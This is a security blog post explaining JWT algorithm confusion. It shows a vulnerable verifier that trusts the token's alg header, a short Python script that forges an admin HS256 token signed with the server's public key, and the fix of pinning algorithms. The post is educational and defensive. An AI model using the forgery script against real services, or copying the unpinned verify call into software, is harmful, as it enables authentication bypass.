---
title: "JWT Algorithm Confusion: How It Happens and How to Prevent It"
date: "2026-10-18"
description: "Why trusting the alg header in a JSON Web Token lets attackers forge tokens, a minimal vulnerable verifier, a demonstration, and the fix."
category: "research"
tags:
  - web
  - jwt
  - authentication
published: true
---

JSON Web Tokens carry their own description of how they were signed. Algorithm confusion happens when a server believes that description instead of deciding for itself.

## Anatomy of a token

![JWT structure: header, payload, signature](/images/jwt-algorithm-confusion/jwt-structure.svg "A JWT is three base64url segments. The header names the algorithm.")

The header contains an `alg` field such as `RS256` (RSA signature, verified with a public key) or `HS256` (HMAC, verified with a shared secret).

## The vulnerable pattern

A server verifies tokens with its RSA public key, but lets the library pick the algorithm from the token:

```javascript
// VULNERABLE: the algorithm comes from the attacker-controlled header
const claims = jwt.verify(token, publicKey);
```

If the library accepts both RSA and HMAC algorithms for a given key, an attacker can:

1. Obtain the server's public key (it is public, often served at `/.well-known/jwks.json`).
2. Change the header to `{"alg":"HS256"}`.
3. Sign the token with HMAC, using the public key bytes as the secret.
4. The server "verifies" the HMAC with the same key bytes and accepts it.

## Demonstration in a lab

On a deliberately vulnerable application you control:

```python
import hmac, hashlib, base64, json

def b64(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")

header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64(json.dumps({"sub": "admin"}).encode())
signing_input = header + b"." + payload
public_key = open("public.pem", "rb").read()
sig = b64(hmac.new(public_key, signing_input, hashlib.sha256).digest())
print((signing_input + b"." + sig).decode())
```

> [!WARNING]
> Only test systems you own or are explicitly authorised to assess.

## Prevention

```javascript
// Pin the algorithm on the server.
const claims = jwt.verify(token, publicKey, { algorithms: ["RS256"] });
```

- Pin accepted algorithms in code or configuration.
- Never use one key object for both asymmetric and symmetric verification.
- Reject `alg: none` unconditionally.
- Validate `iss`, `aud` and `exp` claims after the signature check.

## References

- [RFC 7519: JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 8725: JWT Best Current Practices](https://datatracker.ietf.org/doc/html/rfc8725)
